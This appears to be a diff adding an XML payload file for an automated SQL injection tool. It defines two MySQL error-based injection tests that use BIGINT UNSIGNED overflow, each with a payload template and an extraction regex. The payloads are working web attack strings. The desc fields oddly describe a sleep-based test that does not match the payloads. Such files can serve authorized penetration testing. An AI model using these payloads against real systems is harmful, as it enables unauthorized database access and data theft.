@@ -1,0 +1,30 @@
+
+<root>
+
+    <test>
+        <title>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <desc>AND sleep(_SLEEPTIME)</desc>
+        <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([_RANDNUM0]=[_RANDNUM0],[MARKINT]))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        <time></time>
+        <dbms>MySQL</dbms>
+        <dbms_version>&gt;= 5.5</dbms_version>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <desc>AND sleep(_SLEEPTIME)</desc>
+        <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([_RANDNUM0]=[_RANDNUM0],[MARKINT]))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        <time></time>
+        <dbms>MySQL</dbms>
+        <dbms_version>&gt;= 5.5</dbms_version>
+    </test>
+
+</root>
